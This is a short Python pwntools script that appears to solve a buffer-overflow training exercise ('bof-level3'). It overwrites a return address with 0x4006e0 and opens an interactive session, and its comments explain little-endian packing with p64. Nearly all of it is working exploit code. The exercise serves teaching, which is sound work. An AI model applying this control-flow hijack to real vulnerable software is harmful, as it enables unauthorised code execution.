#!/usr/bin/env python

from pwn import *

p = process('./bof-level3')

buffer = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCABCDEFGHabcdefgh"
buffer += "AAAAAAAA"


# and to put 0x4006e0 as 8 byte little-endian integer,
# we need to put \xe0\x06\x40\x00\x00\x00\x00\x00,
# and to avoid such an ugly notation, we can use p64()

# p64 will convert an integer to little-endian 8-byte string,
# and u64 is the inverse of the function
# (a little endian 8-byte string to an integer)
buffer += p64(0x4006e0);

p.sendline(buffer)


p.interactive()
